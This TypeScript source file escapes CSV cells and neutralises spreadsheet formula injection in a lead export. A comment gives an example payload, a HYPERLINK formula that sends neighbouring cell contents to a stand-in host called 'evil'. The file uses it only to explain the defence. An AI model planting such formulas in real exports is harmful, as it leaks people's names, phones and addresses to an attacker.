/**
 * CSV cell escaping, including spreadsheet formula neutralisation.
 *
 * Two different problems live here and only one of them is about CSV.
 *
 * The first is CSV *format*: commas, quotes and newlines have to be quoted or
 * they break the columns.
 *
 * The second is that Excel, Google Sheets and LibreOffice treat a cell whose
 * text begins with = + - @ (or a tab/carriage return) as a FORMULA rather than
 * text. Lead data is attacker-supplied — /api/webhooks/inbound is public and
 * inserts leads with caller-supplied names — so a lead called
 *   =HYPERLINK("http://evil/?"&A1,"click")
 * sits harmlessly in the database, renders as plain text everywhere in the app,
 * and then becomes live code the moment an admin opens the export. It can
 * exfiltrate the surrounding cells, which are full names, phones and addresses.
 *
 * Prefixing with an apostrophe is the standard neutraliser: spreadsheets read
 * it as "treat the rest as text" and do not display it.
 */

/** Characters that make a spreadsheet evaluate a cell instead of showing it. */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * A plain number, including a negative one.
 *
 * Needed because '-' opens both a formula AND every negative number. Escaping
 * blindly would turn a -1500 deal value into the text "-1500", which breaks
 * sorting and arithmetic in the spreadsheet for a value that was never
 * dangerous. A bare number cannot express a formula, so it is left alone.
 */
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;

/** Escape one cell: neutralise formulas first, then apply CSV quoting. */
export function escapeCsv(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = String(value);

  if (FORMULA_START.test(str) && !PLAIN_NUMBER.test(str)) {
    str = `'${str}`;
  }

  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Join a row of values into a CSV line. */
export function csvRow(values: unknown[]): string {
  return values.map(escapeCsv).join(',');
}
